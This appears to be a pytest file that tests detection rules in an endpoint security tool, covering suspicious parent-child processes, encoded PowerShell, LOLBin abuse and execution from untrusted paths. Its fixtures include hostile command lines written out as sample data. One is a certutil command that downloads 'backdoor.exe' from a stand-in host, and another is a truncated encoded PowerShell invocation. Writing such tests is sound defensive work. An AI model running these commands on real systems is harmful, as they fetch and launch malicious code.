import pytest
from endpoint_guard.config import Config
from endpoint_guard.detection.process_rules import (
    EncodedPowerShellRule,
    LolbinAbuseRule,
    SuspiciousParentChildRule,
    UntrustedPathExecutionRule,
)


@pytest.fixture
def test_config():
    return Config()


def test_suspicious_parent_child_rule(test_config):
    rule = SuspiciousParentChildRule(test_config)
    context = {
        "processes": [
            {
                "pid": 3344,
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -w hidden",
                "parent_pid": 1122,
                "parent_process_name": "winword.exe"
            }
        ]
    }
    alerts = rule.evaluate(context)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "PROC-001"
    assert alerts[0].severity == "High"
    assert alerts[0].pid == 3344


def test_encoded_powershell_rule(test_config):
    rule = EncodedPowerShellRule(test_config)
    context = {
        "processes": [
            {
                "pid": 5566,
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
                "parent_pid": 1000,
                "parent_process_name": "cmd.exe"
            }
        ]
    }
    alerts = rule.evaluate(context)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "PROC-002"
    assert alerts[0].severity == "High"


def test_lolbin_certutil_abuse(test_config):
    rule = LolbinAbuseRule(test_config)
    context = {
        "processes": [
            {
                "pid": 7788,
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://192.168.1.150/backdoor.exe C:\\Temp\\bd.exe",
                "parent_pid": 1000,
                "parent_process_name": "cmd.exe"
            }
        ]
    }
    alerts = rule.evaluate(context)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "PROC-003"
    assert alerts[0].severity == "High"


def test_untrusted_path_execution(test_config):
    rule = UntrustedPathExecutionRule(test_config)
    context = {
        "processes": [
            {
                "pid": 9900,
                "process_name": "dropper.exe",
                "command_line": "dropper.exe",
                "exe_path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\dropper.exe"
            }
        ]
    }
    alerts = rule.evaluate(context)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "PROC-004"
    assert alerts[0].severity == "Medium"
